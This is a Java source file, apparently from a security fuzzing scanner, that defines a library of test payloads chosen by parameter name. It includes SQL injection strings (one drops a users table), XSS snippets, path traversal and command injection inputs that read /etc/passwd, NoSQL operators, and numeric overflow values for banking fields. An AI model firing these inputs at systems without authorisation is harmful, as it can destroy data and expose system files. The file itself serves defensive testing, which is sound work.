package scanners.fuzzing;

import java.util.*;

public class PayloadLibrary {
    private Map<String, List<String>> payloads = new HashMap<>();
    private Random random = new Random();

    public PayloadLibrary() {
        initializePayloads();
    }

    private void initializePayloads() {
        // SQL Injection payloads
        payloads.put("sql", Arrays.asList(
                "' OR '1'='1",
                "' OR 1=1--",
                "'; DROP TABLE users--",
                "' UNION SELECT null, table_name FROM information_schema.tables--",
                "' AND 1=IF(1=1, SLEEP(5), 0)--",
                "1' ORDER BY 1--",
                "1' AND (SELECT COUNT(*) FROM users) > 0--",
                "1' AND SLEEP(5)--",
                "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
        ));

        // XSS payloads
        payloads.put("xss", Arrays.asList(
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "\"><script>alert(1)</script>",
                "javascript:alert(1)",
                "onmouseover=alert(1)",
                "expression(alert(1))",
                "<body onload=alert(1)>"
        ));

        // Path Traversal payloads
        payloads.put("path_traversal", Arrays.asList(
                "../../../../etc/passwd",
                "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "....//....//....//etc/passwd"
        ));

        // Command Injection payloads
        payloads.put("command_injection", Arrays.asList(
                "; ls -la",
                "| whoami",
                "& dir",
                "`cat /etc/passwd`",
                "$(cat /etc/passwd)"
        ));

        // NoSQL Injection payloads
        payloads.put("nosql", Arrays.asList(
                "{\"$ne\": null}",
                "{\"$gt\": \"\"}",
                "{\"$where\": \"sleep(5000)\"}",
                "{\"$exists\": true}",
                "{\"$regex\": \".*\"}"
        ));

        // Business Logic Bypass payloads
        payloads.put("business_logic", Arrays.asList(
                "-1000000", "0.01", "999999999.99", "1.1e308",
                "1000000000000", "2147483647", "4294967295",
                "0000000000", "9999999999", "1234567890",
                "AAAAAAAAAA", "############"
        ));

        // Banking-specific payloads
        payloads.put("banking", Arrays.asList(
                "-999999999.99", "0.0000001", "999999999999.99",
                "18446744073709551615", // max uint64
                "1.7976931348623158e+308", // max double
                "NaN", "Infinity", "-Infinity"
        ));
    }

    public List<String> getPayloads(String type) {
        return payloads.getOrDefault(type, new ArrayList<>());
    }

    public List<String> getAllPayloads() {
        List<String> allPayloads = new ArrayList<>();
        for (List<String> payloadList : payloads.values()) {
            allPayloads.addAll(payloadList);
        }
        return allPayloads;
    }

    public List<String> getPayloadsForParameter(String paramName, String paramType) {
        List<String> selectedPayloads = new ArrayList<>();

        paramName = paramName.toLowerCase();
        paramType = paramType.toLowerCase();

        // Базовые payloads для всех параметров
        selectedPayloads.addAll(getBasicPayloads());

        // SQL Injection для ID, query параметров
        if (paramName.contains("id") || paramName.contains("query") || paramName.contains("search")) {
            selectedPayloads.addAll(getPayloads("sql"));
        }

        // XSS для строковых параметров
        if (paramType.contains("string") &&
                (paramName.contains("name") || paramName.contains("desc") || paramName.contains("message"))) {
            selectedPayloads.addAll(getPayloads("xss"));
        }

        // Path Traversal для file, path параметров
        if (paramName.contains("file") || paramName.contains("path") || paramName.contains("url")) {
            selectedPayloads.addAll(getPayloads("path_traversal"));
        }

        // Command Injection для exec, cmd параметров
        if (paramName.contains("cmd") || paramName.contains("exec") || paramName.contains("command")) {
            selectedPayloads.addAll(getPayloads("command_injection"));
        }

        // NoSQL Injection для JSON параметров
        if (paramType.contains("object") || paramType.contains("json") || paramName.contains("filter")) {
            selectedPayloads.addAll(getPayloads("nosql"));
        }

        // Business Logic для числовых параметров
        if (paramType.contains("number") || paramType.contains("integer") ||
                paramName.contains("amount") || paramName.contains("balance") || paramName.contains("limit")) {
            selectedPayloads.addAll(getPayloads("business_logic"));
            selectedPayloads.addAll(getPayloads("banking"));
        }

        return selectedPayloads;
    }

    private List<String> getBasicPayloads() {
        return Arrays.asList(
                "", "null", "undefined", "true", "false",
                "-1", "0", "9999999999",
                "NaN", "Infinity", "-Infinity"
        );
    }
}